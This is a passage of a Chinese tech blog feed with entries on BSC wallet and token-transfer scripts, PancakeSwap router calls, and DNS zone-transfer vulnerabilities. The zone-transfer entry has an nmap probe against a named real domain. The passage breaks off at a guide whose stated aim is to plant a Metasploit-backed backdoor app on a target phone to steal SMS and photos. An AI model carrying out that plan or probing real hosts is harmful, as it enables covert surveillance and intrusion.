</li>
<li class="lvl-2">
<p>web3.shh.deleteMessageFilter - 删除消息过滤器</p>
</li>
<li class="lvl-2">
<p>web3.shh.getFilterMessages - 读取新消息<br />
Swarm交互</p>
</li>
<li class="lvl-2">
<p>web3.bzz - Swarm交互</p>
</li>
<li class="lvl-2">
<p>web3.bzz.upload - 上传到Swarm</p>
</li>
<li class="lvl-2">
<p>web3.bzz.download - 从Swarm下载</p>
</li>
<li class="lvl-2">
<p>web3.bzz.pick - 打开文件选择器</p>
</li>
</ul>
<hr />
<h1>Refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="http://cw.hubwiz.com/card/c/web3.js-1.0/1/8/24/">web3js中文文档</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>Crypto-批量创建钱包和转账</title>
    <url>/2021/12472.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<p>需求:</p>
<ol>
<li class="lvl-3">
<p>创建40个bsc新钱包</p>
</li>
<li class="lvl-3">
<p>由1个主钱包把某代币平均分发到40个新钱包中去</p>
</li>
</ol>
<hr />
<h1>脚本:</h1>
<h2 id="创建钱包">创建钱包:</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3, HTTPProvider</span><br><span class="line"><span class="keyword">from</span> web3.middleware <span class="keyword">import</span> geth_poa_middleware</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_wallet</span>():</span><br><span class="line">    bscUrl = <span class="string">&quot;&quot;</span></span><br><span class="line">    web3 = Web3(HTTPProvider(bscUrl))</span><br><span class="line">    web3.middleware_stack.inject(geth_poa_middleware, layer=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    password = <span class="string">&quot;&quot;</span></span><br><span class="line">    bscAccount = web3.eth.account.create(password)</span><br><span class="line"></span><br><span class="line">    bscAddress = bscAccount.address</span><br><span class="line">    privateKey = bscAccount.privateKey.<span class="built_in">hex</span>()</span><br></pre></td></tr></table></figure>
<p>这一步遇到的问题主要是，web3js的文档和web3py的有些差异，使用上需要注意。</p>
<h2 id="转账代币">转账代币:</h2>
<p>这一步也很简单，调用代币合约里的<code>transfer</code>函数即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">contract_address = <span class="string">&#x27;&#x27;</span>  <span class="comment"># 代币地址</span></span><br><span class="line">contract = web3.eth.contract(address=contract_address, abi=abi)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 转账数量</span></span><br><span class="line">amount_ether = web3.toWei(amount, <span class="string">&#x27;ether&#x27;</span>)</span><br><span class="line">logger.debug(<span class="string">&quot;[*] send amount: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(amount))</span><br><span class="line"></span><br><span class="line">nonce = web3.eth.getTransactionCount(main_address)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构建交易对象</span></span><br><span class="line">token_tx = contract.functions.transfer(to_addr, amount_ether).buildTransaction(&#123;</span><br><span class="line">    <span class="string">&#x27;chainId&#x27;</span>: <span class="number">56</span>, <span class="string">&#x27;gas&#x27;</span>: <span class="number">200000</span>, <span class="string">&#x27;gasPrice&#x27;</span>: web3.toWei(<span class="string">&quot;5&quot;</span>, <span class="string">&#x27;gwei&#x27;</span>), <span class="string">&#x27;nonce&#x27;</span>: nonce</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment"># 私钥签名，然后发送交易</span></span><br></pre></td></tr></table></figure>
<h2 id="代币合约">代币合约:</h2>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@title</span> ERC20 interface</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@dev</span> see https://github.com/ethereum/EIPs/issues/20</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">interface <span class="title class_">IERC20</span> &#123;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">totalSupply</span>(<span class="params"></span>) external view returns (uint256);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">balanceOf</span>(<span class="params">address who</span>) external view returns (uint256);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">allowance</span>(<span class="params">address owner, address spender</span>)</span><br><span class="line">    external view returns (uint256);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">transfer</span>(<span class="params">address to, uint256 value</span>) external returns (bool);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">approve</span>(<span class="params">address spender, uint256 value</span>)</span><br><span class="line">    external returns (bool);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">transferFrom</span>(<span class="params">address <span class="keyword">from</span>, address to, uint256 value</span>)</span><br><span class="line">    external returns (bool);</span><br><span class="line"></span><br><span class="line">  event <span class="title class_">Transfer</span>(</span><br><span class="line">    address indexed <span class="keyword">from</span>,</span><br><span class="line">    address indexed to,</span><br><span class="line">    uint256 value</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  event <span class="title class_">Approval</span>(</span><br><span class="line">    address indexed owner,</span><br><span class="line">    address indexed spender,</span><br><span class="line">    uint256 value</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">contract <span class="title class_">ERC20</span> is <span class="title class_">IERC20</span> &#123; ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>看一下代币合约的solidity代码，可知大部分代币都是符合erc20标准的，都有几个基础函数.</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>totalSupply():总供应量</p>
</li>
<li class="lvl-2">
<p>balanceOf():余额</p>
</li>
<li class="lvl-2">
<p>allowance():授权的代币数量</p>
</li>
<li class="lvl-2">
<p>transfer():转账</p>
</li>
<li class="lvl-2">
<p>approve():批准花费代币</p>
</li>
<li class="lvl-2">
<p>transferFrom():转账</p>
</li>
</ul>
<hr />
<h1>ERC20:</h1>
<h2 id="什么是Token（代币）？">什么是Token（代币）？</h2>
<p>在Ethereum中，代币几乎可以代表任何东西，从在线平台的信誉点、游戏中角色的技能、彩票到金融资产债券，再到真正的商品，如公司的股份、货币、金盎司等！如此强大的功能，值得也必须处理好。如此强大的功能，理应也必须由一个强大的标准来处理，对吗？这正是<code>ERC-20</code>的作用所在，<code>ERC-20</code>就是针对这些发布的Token（代币）制定的一个固定的基础的标准原则。</p>
<hr />
<h2 id="什么是-ERC20">什么是 ERC20:</h2>
<p><code>ERC-20</code>引入了可替代Token的标准。换句话说，它们具有使每个Token与另一个Token完全相同（在类型和价值上）的属性。例如，<code>ERC-20</code>，Token的行为与ETH相同，这意味着任意1个遵循ERC-20规则的Token与所有其他所有Token是平等和相同的。</p>
<blockquote>
<p>简单地说，任何<code>ERC-20</code>代币都能立即兼容以太坊钱包（几乎所有支持以太币的钱包，包括Jaxx、MEW、imToken等，也支持 erc-20的代币）</p>
<p>由于交易所已经知道这些代币是如何操作的，它们可以很容易地整合这些代币。这就意味着，在很多情况下，这些代币都是可以立即进行交易的。</p>
</blockquote>
<p>标准化非常有利，也就意味着这些资产可以用于不同的平台和项目，否则只能用在特定的场合。</p>
<p>代币（Token）是区块链中定义价值的方式，用于标定金融或数字资产。</p>
<p>在以太坊上，<strong>代币使用相同的标准，这样代币之间的兑换和DAPP支持就会变得容易</strong>。</p>
<hr />
<h2 id="标准规定了哪些内容">标准规定了哪些内容:</h2>
<p>ERC20 是各个代币的标准接口。</p>
<p>ERC20 代币仅仅是以太坊代币的子集。为了充分兼容 ERC20，开发者需要将一组特定的函数（接口）集成到他们的智能合约中，以便在高层面能够执行以下操作：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>获得代币总供应量</p>
</li>
<li class="lvl-2">
<p>获得账户余额</p>
</li>
<li class="lvl-2">
<p>转让代币</p>
</li>
<li class="lvl-2">
<p>批准花费代币</p>
</li>
</ul>
<p>ERC20 让以太坊区块链上的其他智能合约和去中心化应用之间无缝交互。</p>
<hr />
<h2 id="ERC20-标准">ERC20 标准:</h2>
<p>ERC20 标准定义了一个兼容协议, 需要实现的函数. 具体如下.</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ----------------------------------------------------------------------------</span></span><br><span class="line">  <span class="comment">// ERC Token Standard #20 Interface</span></span><br><span class="line">  <span class="comment">// https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20-token-standard.md</span></span><br><span class="line">  <span class="comment">// ----------------------------------------------------------------------------</span></span><br><span class="line">  contract <span class="title class_">ERC20Interface</span> &#123;</span><br><span class="line">      <span class="keyword">function</span> <span class="title function_">totalSupply</span>(<span class="params"></span>) public constant returns (uint);</span><br><span class="line">      <span class="keyword">function</span> <span class="title function_">balanceOf</span>(<span class="params">address tokenOwner</span>) public constant returns (uint balance);</span><br><span class="line">      <span class="keyword">function</span> <span class="title function_">allowance</span>(<span class="params">address tokenOwner, address spender</span>) public constant returns (uint remaining);</span><br><span class="line">      <span class="keyword">function</span> <span class="title function_">transfer</span>(<span class="params">address to, uint tokens</span>) public returns (bool success);</span><br><span class="line">     <span class="keyword">function</span> <span class="title function_">approve</span>(<span class="params">address spender, uint tokens</span>) public returns (bool success);</span><br><span class="line">     <span class="keyword">function</span> <span class="title function_">transferFrom</span>(<span class="params">address <span class="keyword">from</span>, address to, uint tokens</span>) public returns (bool success); </span><br><span class="line">     event <span class="title class_">Transfer</span>(address indexed <span class="keyword">from</span>, address indexed to, uint tokens);</span><br><span class="line">     event <span class="title class_">Approval</span>(address indexed tokenOwner, address indexed spender, uint tokens);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>同时规定了三个必须定义的变量,分别是</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>合约名称</p>
</li>
<li class="lvl-2">
<p>合约代号</p>
</li>
<li class="lvl-2">
<p>合约进制</p>
</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">string public constant name = <span class="string">&quot;Token Name&quot;</span>;</span><br><span class="line">string public constant symbol = <span class="string">&quot;SYM&quot;</span>;</span><br><span class="line">uint8 public constant decimals = <span class="number">18</span>;  <span class="comment">// 18 is the most common number of decimal places</span></span><br></pre></td></tr></table></figure>
<hr />
<h1>Summary:</h1>
<p>cool,脚本是挺简单的，顺便了解了一下<code>erc20</code>的代币标准</p>
<hr />
<h1>refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://github.com/akhdaniel/eth-election/blob/719d5edd4127a8314c958968a195437cb0a1b088/python/test-create-account.py">create wallet web3py</a></p>
</li>
<li class="lvl-2">
<p><a href="https://www.jianshu.com/p/a3a59c651cc2">ERC20代币那么火爆, 那么ERC20到底是什么?</a></p>
</li>
<li class="lvl-2">
<p><a href="https://zhuanlan.zhihu.com/p/313299528">ERC-20是什么？</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>Crypto-调用pancake合约进行交易</title>
    <url>/2021/38991.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<p>最近在看<a href="https://github.com/PancakeBunny-finance/Bunny/blob/main/contracts/zap/ZapBSC.sol">pancakeBunny</a>机枪池的源代码时，看到了他们有个<code>zap</code>功能</p>
<blockquote>
<p>Zap 功能本质上允许用户直接从单一资产（BNB）切换到 LP 代币（BNB-CAKE LP），只需单击一个按钮，而无需进行煎饼交换和切换不同的资产</p>
</blockquote>
<p>源码里是直接调用<code>pancakeswap router</code>合约,后面打算尝试写个类似的<code>dex</code> dapp玩一下。</p>
<p>现在先试一下如何调用<code>pancakeswap router</code>进行代币的交换。</p>
<hr />
<h1>pancakebunny zap 源码:</h1>
<p>贴个函数,solidity的代码量感觉都比较少，多看看多实践应该不难掌握吧~</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 将代币的一半换成另一种代币，然后提供流动性</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">zapInToken</span>(<span class="params">address _from, uint amount, address _to</span>) external override &#123;</span><br><span class="line">        <span class="title class_">IBEP20</span>(_from).<span class="title function_">safeTransferFrom</span>(msg.<span class="property">sender</span>, <span class="title function_">address</span>(<span class="variable language_">this</span>), amount);</span><br><span class="line">        <span class="title function_">_approveTokenIfNeeded</span>(_from);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_">isFlip</span>(_to)) &#123;</span><br><span class="line">            <span class="title class_">IPancakePair</span> pair = <span class="title class_">IPancakePair</span>(_to);</span><br><span class="line">            address token0 = pair.<span class="title function_">token0</span>();</span><br><span class="line">            address token1 = pair.<span class="title function_">token1</span>();</span><br><span class="line">            <span class="keyword">if</span> (_from == token0 || _from == token1) &#123;</span><br><span class="line">                <span class="comment">// swap half amount for other</span></span><br><span class="line">                address other = _from == token0 ? token1 : token0;</span><br><span class="line">                <span class="title function_">_approveTokenIfNeeded</span>(other); <span class="comment">// 授权</span></span><br><span class="line">                uint sellAmount = amount.<span class="title function_">div</span>(<span class="number">2</span>); <span class="comment">// 一半的数量</span></span><br><span class="line">                uint otherAmount = <span class="title function_">_swap</span>(_from, sellAmount, other, <span class="title function_">address</span>(<span class="variable language_">this</span>)); <span class="comment">// 兑换</span></span><br><span class="line">                pair.<span class="title function_">skim</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>));</span><br><span class="line">                <span class="variable constant_">ROUTER</span>.<span class="title function_">addLiquidity</span>(_from, other, amount.<span class="title function_">sub</span>(sellAmount), otherAmount, <span class="number">0</span>, <span class="number">0</span>, msg.<span class="property">sender</span>, block.<span class="property">timestamp</span>); <span class="comment">// 添加流动性</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                uint bnbAmount = _from == <span class="variable constant_">WBNB</span> ? <span class="title function_">_safeSwapToBNB</span>(amount) : <span class="title function_">_swapTokenForBNB</span>(_from, amount, <span class="title function_">address</span>(<span class="variable language_">this</span>));</span><br><span class="line">                <span class="title function_">_swapBNBToFlip</span>(_to, bnbAmount, msg.<span class="property">sender</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title function_">_swap</span>(_from, amount, _to, msg.<span class="property">sender</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<hr />
<h1>Pancakeswap Router交互</h1>
<p><a href="https://bscscan.com/address/0x10ed43c718714eb63d5aa57b78b54704e256024e#writeContract">pancakeswap router contract</a>里面共17个函数,如下</p>
<p>流动性相关:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>addLiquidity</code></p>
</li>
<li class="lvl-2">
<p><code>addLiquidityETH</code></p>
</li>
<li class="lvl-2">
<p><code>removeLiquidity</code></p>
</li>
<li class="lvl-2">
<p><code>removeLiquidityETH</code></p>
</li>
<li class="lvl-2">
<p><code>removeLiquidityETHSupportingFeeOnTransferTokens</code></p>
</li>
<li class="lvl-2">
<p><code>removeLiquidityETHWithPermit</code></p>
</li>
<li class="lvl-2">
<p><code>removeLiquidityETHWithPermitSupportingFeeOnTransferTokens</code></p>
</li>
<li class="lvl-2">
<p><code>removeLiquidityWithPermit</code></p>
</li>
</ul>
<p>swap相关:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>swapETHForExactTokens</code></p>
</li>
<li class="lvl-2">
<p><code>swapExactETHForTokens</code></p>
</li>
<li class="lvl-2">
<p><code>swapExactETHForTokensSupportingFeeOnTransferTokens</code></p>
</li>
<li class="lvl-2">
<p><code>swapExactTokensForETH</code></p>
</li>
<li class="lvl-2">
<p><code>swapExactTokensForETHSupportingFeeOnTransferTokens</code></p>
</li>
<li class="lvl-2">
<p><code>swapExactTokensForTokens</code></p>
</li>
<li class="lvl-2">
<p><code>swapExactTokensForTokensSupportingFeeOnTransferTokens</code></p>
</li>
<li class="lvl-2">
<p><code>swapTokensForExactETH</code></p>
</li>
<li class="lvl-2">
<p><code>swapTokensForExactTokens</code></p>
</li>
</ul>
<hr />
<h2 id="Swap-BNB-anyToken">Swap: BNB -&gt; anyToken</h2>
<h3 id="swapExactETHForTokens">swapExactETHForTokens:</h3>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/2C5A9C3B-04CF-42FA-9542-72640DFFBC3E.png" alt="2C5A9C3B-04CF-42FA-9542-72640DFFBC3E" /></p>
<p>swapExactETHForTokens():</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>amountOutMin</code>:收到最小量</p>
</li>
<li class="lvl-2">
<p><code>path</code>:代币地址列表,eg:<code>[BNB代币地址,anyToken代币地址]</code></p>
</li>
<li class="lvl-2">
<p><code>to</code>:收币地址</p>
</li>
<li class="lvl-2">
<p><code>deadline</code>:交易过期时间</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pancakeswap2_txn = contract.functions.swapExactETHForTokens(</span><br><span class="line">    <span class="comment"># 10000000000,  # set to 0, or specify minimum amount of tokeny you want to receive - consider decimals!!!</span></span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    [spend, tokenToBuy],</span><br><span class="line">    sender_address,</span><br><span class="line">    (<span class="built_in">int</span>(time.time()) + <span class="number">10000</span>)</span><br><span class="line">).buildTransaction(&#123;</span><br><span class="line">    <span class="string">&#x27;from&#x27;</span>: sender_address,</span><br><span class="line">    <span class="string">&#x27;value&#x27;</span>: web3.toWei(<span class="number">0.0001</span>, <span class="string">&#x27;ether&#x27;</span>),  <span class="comment"># This is the Token(BNB) amount you want to Swap from</span></span><br><span class="line">    <span class="string">&#x27;gas&#x27;</span>: <span class="number">160000</span>,</span><br><span class="line">    <span class="string">&#x27;gasPrice&#x27;</span>: web3.toWei(<span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;gwei&#x27;</span>),</span><br><span class="line">    <span class="string">&#x27;nonce&#x27;</span>: nonce,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>例子:<a href="https://bscscan.com/tx/0x2cc0a920f509a893850a9cb625be4dfee35efc89734df6440d27053b16e03a63">记录tx</a></p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20211014204336.png" alt="20211014204336" /></p>
<hr />
<h2 id="Swap-AToken-BToken">Swap: AToken -&gt; BToken</h2>
<h3 id="approve授权">approve授权:</h3>
<p>先要将你的代币授权给<code>pancakeswap router contract</code></p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/A7140CDA-DE03-4BE6-86B4-1490396BE088.png" alt="A7140CDA-DE03-4BE6-86B4-1490396BE088" /></p>
<p>approve():</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>spender:给予授权的地址,这里是要授权给<code>pancakeswap router contract</code></p>
</li>
<li class="lvl-2">
<p>rawAmount:代币数量</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">aprove_txn = erc20_contract.functions.approve(</span><br><span class="line">    <span class="comment"># 10000000000,  # set to 0, or specify minimum amount of tokeny you want to receive - consider decimals!!!</span></span><br><span class="line">    panRouterContractAddress, max_approval_int</span><br><span class="line">).buildTransaction(&#123;</span><br><span class="line">    <span class="string">&#x27;from&#x27;</span>: sender_address,</span><br><span class="line">    <span class="string">&#x27;value&#x27;</span>: <span class="number">0</span>,  <span class="comment"># This is the Token(BNB) amount you want to Swap from</span></span><br><span class="line">    <span class="string">&#x27;gas&#x27;</span>: <span class="number">160000</span>,</span><br><span class="line">    <span class="string">&#x27;gasPrice&#x27;</span>: web3.toWei(<span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;gwei&#x27;</span>),</span><br><span class="line">    <span class="string">&#x27;nonce&#x27;</span>: nonce,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>例子:<a href="https://bscscan.com/tx/0x2cc0a920f509a893850a9cb625be4dfee35efc89734df6440d27053b16e03a63">记录tx</a><br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20211014202846.png" alt="20211014202846" /></p>
<h3 id="swapExactTokensForTokens">swapExactTokensForTokens:</h3>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/C28E659E-C391-4DC5-9A22-C5E78E5C92E7.png" alt="C28E659E-C391-4DC5-9A22-C5E78E5C92E7" /></p>
<p>swapExactTokensForTokens():</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>amountIn:交换数量</p>
</li>
<li class="lvl-2">
<p>amountOutMin:收到最小量,考虑滑点</p>
</li>
<li class="lvl-2">
<p><code>path</code>:代币地址列表,一般要有中间代币,eg:<code>[AToken代币地址,中间代币地址,BToken代币地址]</code></p>
</li>
<li class="lvl-2">
<p><code>to</code>:收币地址</p>
</li>
<li class="lvl-2">
<p><code>deadline</code>:交易过期时间</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pancakeswap2_txn = contract.functions.swapExactTokensForTokens(</span><br><span class="line">    <span class="comment"># 10000000000,  # set to 0, or specify minimum amount of tokeny you want to receive - consider decimals!!!</span></span><br><span class="line">    web3.toWei(<span class="number">50</span>, <span class="string">&#x27;ether&#x27;</span>), web3.toWei(<span class="number">0.04</span>, <span class="string">&#x27;ether&#x27;</span>), [tokenToBuy, cake_token, USDT_token], sender_address, (<span class="built_in">int</span>(time.time()) + <span class="number">10000</span>)</span><br><span class="line">).buildTransaction(&#123;</span><br><span class="line">    <span class="string">&#x27;from&#x27;</span>: sender_address,</span><br><span class="line">    <span class="string">&#x27;value&#x27;</span>: <span class="number">0</span>,  <span class="comment"># This is the Token(BNB) amount you want to Swap from</span></span><br><span class="line">    <span class="string">&#x27;gas&#x27;</span>: <span class="number">220000</span>,</span><br><span class="line">    <span class="string">&#x27;gasPrice&#x27;</span>: web3.toWei(<span class="string">&#x27;5.1&#x27;</span>, <span class="string">&#x27;gwei&#x27;</span>),</span><br><span class="line">    <span class="string">&#x27;nonce&#x27;</span>: nonce,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>例子:<a href="https://bscscan.com/tx/0xf512c118a6e5082aacf72b789125bda47a639eea52b36b635678c25e6e316cc1">记录tx</a><br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20211014204147.png" alt="20211014204147" /></p>
<hr />
<h1>Bug:</h1>
<p>暂时只遇到以下报错:</p>
<h2 id="TRANSFER-FAILED">TRANSFER_FAILED:</h2>
<p><code>Fail with error 'Pancake: TRANSFER_FAILED'</code>:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>注意授权</p>
</li>
<li class="lvl-2">
<p>注意gas fee够不够</p>
</li>
</ul>
<h2 id="INSUFFICIENT-OUTPUT-AMOUNT-or-INSUFFICIENT-INPUT-AMOUNT">INSUFFICIENT_OUTPUT_AMOUNT or INSUFFICIENT_INPUT_AMOUNT</h2>
<p><code>Fail with error 'PancakeRouter: INSUFFICIENT_OUTPUT_AMOUNT</code><br />
<code>Fail with error 'PancakeLibrary: INSUFFICIENT_INPUT_AMOUNT</code></p>
<p>注意数量单位是<code>wei</code>,可以用<code>web3.toWei('5.1', 'gwei'),</code>转换成gwei</p>
<hr />
<h1>Question:</h1>
<p>还有几个问题还有些疑惑:</p>
<ol>
<li class="lvl-3">
<p>调用<code>swapExactTokensForTokens</code>，如何自动获取中间的转换代币?是用<code>BNB</code>还是<code>CAKE</code>?</p>
</li>
<li class="lvl-3">
<p>通过滑点计算出<code>amountOutMin</code></p>
</li>
<li class="lvl-3">
<p>gas fee要给多少?才不会过高过低?</p>
</li>
</ol>
<hr />
<h1>Todo:</h1>
<ol>
<li class="lvl-3">
<p>部署合约，做个和Zap类似的小dapp</p>
</li>
<li class="lvl-3">
<p>defi自动收菜</p>
<ul class="lvl-2">
<li class="lvl-5">定时收菜，每过一段时间(如每月15号)，自动collect,然后卖出换U, 甚至进一步可以 将u质押到<code>venus</code>里</li>
<li class="lvl-5">冲新矿的二矿,有高apr，短时间挖提买，监控代币，如果代币价格接近成本价，则全部清仓</li>
</ul>
</li>
</ol>
<blockquote>
<p>还是要多实践多do呀，maybe会有一些new idea~</p>
</blockquote>
<hr />
<h1>Refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://github.com/PancakeBunny-finance/Bunny/blob/main/contracts/zap/ZapBSC.sol">pancakeBunny源码</a></p>
</li>
<li class="lvl-2">
<p><a href="https://bscscan.com/address/0x10ed43c718714eb63d5aa57b78b54704e256024e#writeContract">pancakeswap router contract</a></p>
</li>
<li class="lvl-2">
<p><a href="https://www.followchain.org/transfer-from-failed-pancakeswap/#1">How to Fix “TRANSFER_FROM_FAILED” on PancakeSwap</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>DNS域传送漏洞</title>
    <url>/2020/40526.html</url>
    <content><![CDATA[<h1>DNS域传送漏洞:</h1>
<h2 id="DNS记录分类">DNS记录分类</h2>
<p>常见的DNS记录有以下几类：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A记录       IP地址记录,记录一个域名对应的IP地址</span><br><span class="line">AAAA记录    IPv6地址记录，记录一个域名对应的IPv6地址</span><br><span class="line">CNAME记录   别名记录，记录一个主机的别名</span><br><span class="line">MX记录      电子邮件交换记录，记录一个邮件域名对应的IP地址</span><br><span class="line">NS记录      域名服务器记录 ,记录该域名由哪台域名服务器解析</span><br><span class="line">PTR记录     反向记录，也即从IP地址到域名的一条记录</span><br><span class="line">TXT记录     记录域名的相关文本信息</span><br></pre></td></tr></table></figure>
<hr />
<h2 id="原理-2">原理:</h2>
<p>DNS服务器分为：主服务器、备份服务器和缓存服务器。</p>
<p>在主备服务器之间同步数据库，需要使用“DNS域传送”。</p>
<p><strong>域传送是指备份服务器从主服务器拷贝数据，并用得到的数据更新自身数据库。</strong></p>
<p>若DNS服务器<strong>配置不当（本来只有备份服务器能获得主服务器的数据，由于漏洞导致任意client都能通过“域传送”获得主服务器的数据（zone数据库信息））</strong>，可能导致攻击者获取某个域的所有记录。</p>
<p>造成整个网络的拓扑结构泄露给潜在的攻击者，包括一些安全性较低的内部主机，如测试服务器。</p>
<p>同时，黑客可以快速的判定出某个特定zone的所有主机，收集域信息，选择攻击目标，找出未使用的IP地址，绕过基于网络的访问控制。</p>
<p>攻击者能获取的敏感主要包括：</p>
<p>1）网络的拓扑结构，服务器集中的IP地址段</p>
<p>2）数据库服务器的IP地址</p>
<p>3）测试服务器的IP地址，</p>
<p>4）VPN服务器地址泄露</p>
<p>5）其他敏感服务器</p>
<hr />
<h2 id="检测">检测:</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap --script dns-zone-transfer --script-args dns-zone-transfer.domain=li-ning.com -p 53 -Pn ns.lining.cn</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20201113100039.png" alt="20201113100039" /></p>
<hr />
<h1>refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://www.jianshu.com/p/d2af08e6f8fb">dns 域传送漏洞利用总结</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>WebSecurity</category>
      </categories>
      <tags>
        <tag>WebSecurity</tag>
      </tags>
  </entry>
  <entry>
    <title>DevRecord-AndroidBackdoorApp</title>
    <url>/2023/3464.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<p>需求:给一个目标安卓手机植入后门app,以获取其短信、相册等信息。</p>
<h1>整体思路:</h1>
<ol>
<li class="lvl-3">
<p>服务器安装并运行msf框架,开启监听</p>
</li>
<li class="lvl-3">
<p>使用<a href="https://github.com/ba0gu0/520apkhook?tab=readme-ov-file">520apkhook</a>注入一个干净的apk,生成新的apk</p>
</li>
<li class="lvl-3">
<p>目标手机安装修改后的apk,打开app后,肉鸡能够上线</p>
</li>
</ol>
<h1>centos7运行msf框架:</h1>
<h2 id="安装msf">安装msf:</h2>
<p>参考文章:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://feng4.github.io/2019/08/19/centos%E5%AE%89%E8%A3%85msf/">centos安装msf</a></p>
</li>
<li class="lvl-2">
<p><a href="https://blog.csdn.net/weixin_46944519/article/details/126773677">Centos 7.6安装MetaSploit</a></p>
</li>
<li class="lvl-2">
<p><a href="https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html">metasploit官方文档</a></p>
</li>
</ul>
<p>msf快速安装命令:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; <span class="built_in">chmod</span> 755 msfinstall &amp;&amp; ./msfinstall</span><br></pre></td></tr></table></figure>
<p>快速安装脚本报错,需要修改yum的一些配置:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">vim /usr/libexec/urlgrabber-ext-down</span><br><span class="line">vim /usr/bin/yum</span><br><span class="line"></span><br><span class="line">python -&gt; python2</span><br></pre></td></tr></table></figure>
<p>报错解决参考文章:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://stackoverflow.com/questions/11213520/yum-crashed-with-keyboard-interrupt-error">Yum crashed with Keyboard Interrupt error</a></p>
</li>
<li class="lvl-2">
